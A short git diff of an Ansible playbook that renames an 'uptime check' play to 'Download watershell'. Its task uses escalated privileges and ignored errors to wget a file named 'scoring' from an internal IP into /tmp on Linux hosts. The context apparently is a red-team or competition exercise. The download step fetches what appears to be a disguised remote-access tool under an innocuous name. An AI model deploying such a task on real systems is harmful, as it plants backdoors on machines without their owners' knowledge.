@@ -1,10 +1,10 @@
-- name: Check the remote host uptime
+- name: Download watershell
   hosts: linux
   become: true
   become_method: enable
   ignore_errors: true
   tasks:
-    - name: Execute the Uptime command over Command module
+    - name: download watershell
       register: uptimeoutput
       command: "wget 10.12.48.21/scoring -O /tmp/scoring;"
 
